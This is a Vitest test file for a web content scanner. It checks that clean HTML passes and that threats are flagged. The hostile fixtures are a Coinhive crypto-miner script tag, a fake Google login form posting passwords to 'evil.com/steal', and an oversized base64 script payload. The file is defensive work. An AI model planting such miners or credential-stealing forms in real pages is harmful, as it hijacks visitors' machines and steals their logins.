import { describe, it, expect } from 'vitest';
import { scanContent } from '../content-scanner';

describe('scanContent', () => {
  it('passes clean HTML', () => {
    const html = '<html><body><h1>Hello</h1><script>fetch("/api/data")</script></body></html>';
    const result = scanContent(html);
    expect(result.safe).toBe(true);
    expect(result.flags).toHaveLength(0);
  });

  it('flags crypto miner scripts', () => {
    const html = '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
    const result = scanContent(html);
    expect(result.safe).toBe(false);
    expect(result.flags).toContain('crypto_miner');
  });

  it('flags known phishing patterns', () => {
    const html = '<form action="https://evil.com/steal"><input name="password" type="password"><button>Login to Google</button></form>';
    const result = scanContent(html);
    expect(result.safe).toBe(false);
  });

  it('flags excessive base64 data (possible obfuscation)', () => {
    const bigBase64 = 'data:application/javascript;base64,' + 'A'.repeat(500000);
    const html = `<script src="${bigBase64}"></script>`;
    const result = scanContent(html);
    expect(result.safe).toBe(false);
    expect(result.flags).toContain('suspicious_base64');
  });

  it('rejects files over size limit', () => {
    const result = scanContent('x', 6 * 1024 * 1024); // 6MB
    expect(result.safe).toBe(false);
    expect(result.flags).toContain('file_too_large');
  });

  it('allows normal fetch usage', () => {
    const html = '<script>fetch("https://api.example.com/data").then(r => r.json())</script>';
    const result = scanContent(html);
    expect(result.safe).toBe(true);
  });
});
